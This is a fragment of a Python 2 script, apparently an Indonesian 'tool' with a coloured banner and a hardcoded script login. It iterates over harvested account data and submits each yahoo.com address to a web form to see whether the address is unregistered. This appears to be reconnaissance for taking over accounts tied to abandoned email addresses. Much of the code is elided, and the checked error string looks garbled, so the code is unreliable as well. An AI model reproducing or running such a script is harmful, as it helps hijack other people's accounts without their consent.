...
\033[1;96m [¤] \x1b[1;93mSELAMAT DATAMG\x1b[1;96m      [¤] \x1b[1;93mLOGIN SC: UNTUK LOGIN +USERNAME+:Ramadan +PASSWORD+:Berkah\x1b[1;96m  
\033[1;96m [¤] \x1b[1;93mTOOLS MUHAMMAD RAFLI\x1b[1;96m  [¤] \x1b[1;93mYOUTUBE  : Muryxty -XDi\x1b[1;96m"""
print " \x1b[1;93m============================================================="

CorrectUsername = "Ramadan"
CorrectPassword = "Berkah"
	...
	for w in kimak['data']:
		...
		try:
			...
			if 'yahoo.com' in otw:
				...
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_Ramadan">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_Ramadan">' in pek:
